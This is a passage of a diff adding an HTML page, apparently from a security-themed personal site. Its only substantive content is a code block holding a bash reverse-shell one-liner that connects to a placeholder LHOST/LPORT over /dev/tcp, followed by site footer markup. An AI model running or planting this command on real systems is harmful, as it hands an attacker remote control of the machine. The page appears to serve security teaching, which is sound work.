+						<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/LHOST/LPORT <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
+						</code></pre>
+					</div>
+    			</div>
+
+			</section>
+
+		</div>
+
+		<!-- Footer -->
+		<footer id="footer">
+			<section class="split contact">
+				<section>
+					<h3>Social</h3>
+					<ul class="icons alt">
+						<li><a href="https://twitter.com/cyberthirty30" class="icon brands fa-twitter"><span
+									class="label">Twitter</span></a></li>
+						<li><a href="https://www.linkedin.com/in/cyber30/" class="icon brands fa-linkedin"><span
+									class="label">Instagram</span></a></li>
+						<li><a href="https://github.com/cyberthirty/" class="icon brands fa-github"><span
+									class="label">GitHub</span></a></li>
+					</ul>
+				</section>
+			</section>
+		</footer>
+
+		<!-- Copyright -->
+		<div id="copyright">
+			<ul>
+				<li>&copy; 2023 <a href="https://github.com/cyberthirty/">CYBER30 Inc</a></li>
+			</ul>
+		</div>
+
+
+	</div>
+
+	<!-- Scripts -->
+	<script src="assets/js/jquery.min.js"></script>
+	<script src="assets/js/jquery.scrollex.min.js"></script>
+	<script src="assets/js/jquery.scrolly.min.js"></script>
+	<script src="assets/js/browser.min.js"></script>
+	<script src="assets/js/breakpoints.min.js"></script>
+	<script src="assets/js/util.js"></script>
+	<script src="assets/js/main.js"></script>
+
+</body>
+
+</html>
